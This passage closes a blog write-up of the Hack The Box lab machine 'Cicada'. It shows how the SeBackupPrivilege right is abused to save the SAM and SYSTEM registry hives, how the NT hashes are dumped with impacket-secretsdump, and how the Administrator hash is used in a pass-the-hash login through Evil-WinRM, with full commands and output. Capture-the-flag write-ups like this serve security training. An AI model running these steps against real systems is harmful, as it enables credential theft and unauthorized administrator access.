<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-PowerShell" data-lang="PowerShell"><span style="display:flex;"><span>*Evil-WinRM* PS C:\&gt; reg save hklm\sam C:\Temp\sam.bak
</span></span><span style="display:flex;"><span>The operation completed successfully.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:\&gt; reg save hklm\system C:\Temp\system.bak
</span></span><span style="display:flex;"><span>The operation completed successfully.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:\&gt; cd Temp
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:\Temp&gt; download sam.bak
</span></span><span style="display:flex;"><span>                                        
</span></span><span style="display:flex;"><span>Info<span style="color:#960050;background-color:#1e0010">:</span> Downloading C:\Temp\sam.bak to sam.bak
</span></span><span style="display:flex;"><span>                                        
</span></span><span style="display:flex;"><span>Info<span style="color:#960050;background-color:#1e0010">:</span> Download successful!
</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:\Temp&gt; download system.bak
</span></span><span style="display:flex;"><span>                                        
</span></span><span style="display:flex;"><span>Info<span style="color:#960050;background-color:#1e0010">:</span> Downloading C:\Temp\system.bak to system.bak
</span></span><span style="display:flex;"><span>                                        
</span></span><span style="display:flex;"><span>Info<span style="color:#960050;background-color:#1e0010">:</span> Download successful!
</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:\Temp&gt;
</span></span></code></pre></div><p>Now that we have the <code>SAM</code> and <code>SYSTEM</code> files, we can use a tool like <code>secretsdump</code> to extract the hashes stored on the system.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>pl4stic㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/cicada<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ impacket-secretsdump LOCAL -sam sam.bak -system system.bak
</span></span><span style="display:flex;"><span>Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Target system bootKey: 0x3c2b033757a49110a9ee680b46e8d620
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Dumping local SAM hashes <span style="color:#f92672">(</span>uid:rid:lmhash:nthash<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
</span></span><span style="display:flex;"><span>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span></span><span style="display:flex;"><span>DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> SAM hashes extraction <span style="color:#66d9ef">for</span> user WDAGUtilityAccount failed. The account doesn<span style="color:#960050;background-color:#1e0010">&#39;</span>t have hash information.
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Cleaning up...
</span></span></code></pre></div><h3 id="shell-as-administrator">Shell as Administrator</h3>
<p>Let&rsquo;s try using the hash to login as <code>Administrator</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>pl4stic㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/cicada<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ evil-winrm -i 10.129.84.61 -u administrator -H 2b87e7c93a3e8a0ea4a581937016f341 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Evil-WinRM shell v3.7
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Info: Establishing connection to remote endpoint
</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\D</span>ocuments&gt; whoami
</span></span><span style="display:flex;"><span>cicada<span style="color:#ae81ff">\a</span>dministrator
</span></span></code></pre></div>
  
  <hr>
<div class="footer">
    
	    
            <a class="previous-post" href="https://pL4sTiC1337.github.io/writeups/htb-forest/?ref=footer"><span style="font-weight:bold;">« Previous</span><br>HtB Forest</a>
        
	    
    
</div>

  
</div>
            </main>
            
  
    <div class="article-toc ">
    <div class="toc-wrapper">
      <h4 id="contents"></h4>
      <nav id="TableOfContents">
  <ul>
    <li><a href="#scanning">Scanning</a>
      <ul>
        <li><a href="#nmap">nmap</a></li>
        <li><a href="#smb">SMB</a></li>
        <li><a href="#notice-from-hrtxt">Notice from HR.txt</a></li>
      </ul>
    </li>
    <li><a href="#initial-access">Initial Access</a>
      <ul>
        <li><a href="#user-enumeration">User Enumeration</a></li>
        <li><a href="#password-spraying">Password Spraying</a></li>
        <li><a href="#bloodhound">Bloodhound</a></li>
        <li><a href="#smb-dev">SMB (DEV)</a></li>
        <li><a href="#backup_scriptps1">Backup_script.ps1</a></li>
        <li><a href="#shell-as-emilyoscars">Shell as emily.oscars</a></li>
      </ul>
    </li>
    <li><a href="#privilege-escalation">Privilege Escalation</a>
      <ul>
        <li><a href="#enumeration">Enumeration</a></li>
        <li><a href="#sebackupprivilege">SeBackupPrivilege</a></li>
        <li><a href="#shell-as-administrator">Shell as Administrator</a></li>
      </ul>
    </li>
  </ul>
</nav>
    </div>
</div>

  

        </div>
    </body>
</html>
